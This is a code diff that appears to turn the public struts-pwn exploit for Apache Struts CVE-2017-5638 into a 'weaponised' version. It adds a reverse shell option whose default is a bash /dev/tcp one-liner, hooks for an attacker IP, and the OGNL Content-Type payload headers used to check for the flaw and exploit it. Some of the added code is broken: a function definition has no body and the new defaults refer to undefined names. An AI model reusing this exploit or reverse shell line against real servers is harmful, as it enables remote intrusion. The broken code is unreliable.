@@ -1,12 +1,10 @@
 #!/usr/bin/env python3
 # coding=utf-8
 # *****************************************************
-# struts-pwn: Apache Struts CVE-2017-5638 Exploit
+# struts-shell
 # Author:
-# Mazin Ahmed <Mazin AT MazinAhmed DOT net>
-# This code is based on:
-# https://www.exploit-db.com/exploits/41570/
-# https://www.seebug.org/vuldb/ssvid-92746
+# ZephrFish https://twitter.com/ZephrFish
+# This code a weaponised form of https://github.com/mazen160/struts-pwn
 # *****************************************************
 import sys
 import random
@@ -22,7 +20,8 @@ except:
 
 if len(sys.argv) <= 1:
     print('[*] CVE: 2017-5638 - Apache Struts2 S2-045')
-    print('[*] Struts-PWN - @mazen160')
+    print('[*] Original Struts-PWN - @mazen160')
+    print('[!] Weaponised Version - @ZephrFish')
     print('\n%s -h for help.' % (sys.argv[0]))
     exit(0)
 
@@ -44,12 +43,19 @@ parser.add_argument("--check",
                     dest="do_check",
                     help="Check if a target is vulnerable.",
                     action='store_true')
+#parser.add_argument("--shell",
+#                    dest="spawn_shell",
+#                    help="Try and gain a reverse shell to your machine on port x",
+#                    action='store_true',
+#                    default='/bin/bash -i >& /dev/tcp/127.0.0.1/x 0>&1')
+
 args = parser.parse_args()
 url = args.url if args.url else None
 usedlist = args.usedlist if args.usedlist else None
 url = args.url if args.url else None
 cmd = args.cmd if args.cmd else None
 do_check = args.do_check if args.do_check else None
+#spawn_shell = args.spawn_shell if args.spawn_shell else None
 
 
 def url_prepare(url):
@@ -57,9 +63,11 @@ def url_prepare(url):
     url = url.replace(' ', '%20')
     if ('://' not in url):
         url = str('http') + str('://') + str(url)
-    elif ('http://' in url):
-        url = url.replace('http://', 'https://')
+#    elif ('http://' in url):
+#        url = url.replace('http://', 'https://')
     return(url)
+
+def spawn_shell
 
 
 def exploit(url, cmd):
@@ -87,7 +95,6 @@ def exploit(url, cmd):
 
     headers = {
         'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.117 Safari/537.36',
-        # 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
         'Content-Type': str(payload),
         'Accept': '*/*'
     }
@@ -111,7 +118,6 @@ def check(url):
     payload += "addHeader('%s','%s')}.multipart/form-data" % (random_string, random_string)
     headers = {
         'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.117 Safari/537.36',
-        # 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
         'Content-Type': str(payload),
         'Accept': '*/*'
     }
@@ -129,7 +135,7 @@ def check(url):
     return(result)
 
 
-def main(url=url, usedlist=usedlist, cmd=cmd, do_check=do_check):
+def main(url=url, usedlist=usedlist, cmd=cmd, do_check=do_check, spawn_shell=spawn_shell + attackIP):
     if url:
         if do_check:
             result = check(url)  # Only check for existence of Vulnerablity
@@ -166,7 +172,6 @@ def main(url=url, usedlist=usedlist, cmd=cmd, do_check=do_check):
             else:
                 output = exploit(url, cmd)  # Exploit
             print(output)
-
     print('[%] Done.')
 
 if __name__ == '__main__':
